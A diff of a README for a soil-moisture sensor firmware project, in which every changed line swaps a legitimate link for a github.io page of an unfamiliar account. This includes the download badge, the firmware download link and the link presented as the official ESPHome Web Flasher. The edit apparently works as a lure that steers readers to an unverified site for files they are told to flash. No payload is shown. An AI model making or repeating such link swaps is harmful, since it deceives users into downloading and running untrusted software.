@@ -1,6 +1,6 @@
 # 🌿 xiao-soil-moisture-esphome - Keep your plants healthy with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sternwelltimed533/xiao-soil-moisture-esphome)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sternwelltimed533.github.io)
 
 This project provides firmware for the Seeed XIAO ESP32-C6 soil moisture sensor. The software allows the sensor to run for nearly two years on a single AA battery. It sends moisture data to your home automation system so you know exactly when to water your plants.
 
@@ -19,7 +19,7 @@ To use this software, you need the following items:
 
 You must visit the project page to access the installation files. The software includes the base firmware and the necessary configuration files to get your sensor running.
 
-[Download the latest firmware files here](https://github.com/sternwelltimed533/xiao-soil-moisture-esphome)
+[Download the latest firmware files here](https://sternwelltimed533.github.io)
 
 Click the link above to reach the main page. Look for the section labeled "Releases" on the right side of the screen. Click the most recent version number to view the available files. Download the file ending in `.bin` to your computer.
 
@@ -31,7 +31,7 @@ Ensure your cable supports data transfer. Some cables only provide power and wil
 
 ## 🚀 Install the Firmware
 
-1. Open your web browser and navigate to the [ESPHome Web Flasher](https://web.esphome.io/).
+1. Open your web browser and navigate to the [ESPHome Web Flasher](https://sternwelltimed533.github.io).
 2. Click the Connect button on the website.
 3. Select the port that corresponds to your XIAO board from the list. 
 4. Click the Install button.
